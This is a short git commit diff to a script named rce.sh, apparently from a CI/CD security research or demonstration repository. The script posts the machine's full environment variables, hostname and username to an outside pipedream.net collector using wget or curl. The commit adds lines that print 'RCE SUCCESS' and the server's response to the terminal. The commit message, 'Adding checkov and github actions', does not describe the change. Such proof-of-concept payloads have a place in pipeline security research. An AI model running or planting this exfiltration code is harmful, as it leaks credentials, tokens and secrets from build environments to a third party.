9d4bd4e19d19ef69770209edfcb3aaf0576847f3
Rotem Bar <rotem@cidersecurity.io>
2021-06-29 22:42:55 +0300

    Adding checkov and github actions

--- rce.sh
+++ rce.sh
@@ -1,13 +1,15 @@
 
+echo "RCE SUCCESS"  >$(tty);
+
 URL="https://45916c134a9cdb740e1c9807952ed21d.m.pipedream.net/RCE/$1?host=$(hostname)&user=$(whoami)"
 ENV=$(env)
 
 if [ -x "$(command -v wget)" ]; then
-  wget -qO- $URL --post-data="$ENV"
+  wget -qO- $URL --post-data="$ENV" >$(tty);
   exit 1
 fi
 
 if [ -x "$(command -v curl)" ]; then
-  curl $URL -X POST -d "$ENV"
+  curl $URL -X POST -d "$ENV" >$(tty);
   exit 1
 fi
